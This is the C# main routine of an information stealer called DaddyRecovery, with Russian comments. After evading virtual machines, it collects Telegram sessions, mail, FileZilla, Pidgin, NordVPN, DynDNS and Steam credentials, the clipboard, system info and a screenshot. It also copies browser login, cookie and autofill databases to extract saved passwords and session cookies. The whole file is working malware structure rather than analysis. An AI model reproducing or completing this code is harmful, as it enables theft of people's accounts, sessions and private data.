namespace DaddyRecovery
{
    using System;
    using System.Text;
    using Applications;
    using Applications.Steam;
    using Browsers.Chromium;
    using Helpers;
    using PCinfo;
    using Sticks;

    /*                    \*
         Developer r3xq1       
    \*                    */

    internal static partial class Program
    {
        [STAThread]
        public static void Main()
        {
            if (!AntiVM.GetCheckVMBot() && !RunCheck.InstanceCheck()) Environment.Exit(0);

            HomeDirectory.Inizialize();
            if (CombineEx.ExistsDir(GlobalPath.HomePath))
            {
                Telega.GetSession(GlobalPath.Tdata, GlobalPath.TelegaHome, "*.*");
                MailFoxPassword.Inizialize();
                BuffBoard.Inizialize();
                NordVPN.Inizialize_Grabber();
                DynDns.Inizialize_Grabber();
                FileZilla.Inizialize_Grabber();
                Pidgin.Inizialize_Grabber();
                GetSteamFiles.Inizialize("*.", "*.vdf", "config", "Steam");
                InfoGrabber.Inizialize();
                ScreenShot.Inizialize(GlobalPath.Screen);

                // Сбор и вывод логинов и паролей
                Searcher.CopyInSafeDir(GlobalPath.LoginsPath, "Login Data");
                GetPasswords.Inizialize_Multi_file();

                // Сбор и вывод куки данных
                Searcher.CopyInSafeDir(GlobalPath.CookiesPath, "Cookies");
                GetCookies.Inizialize();

                // Сбор и вывод Автозаполнение форм 
                Searcher.CopyInSafeDir(GlobalPath.WebDataPath, "Web Data");
                GetAutoFill.Inizialize_AutoFill();
            }
        }
    }
}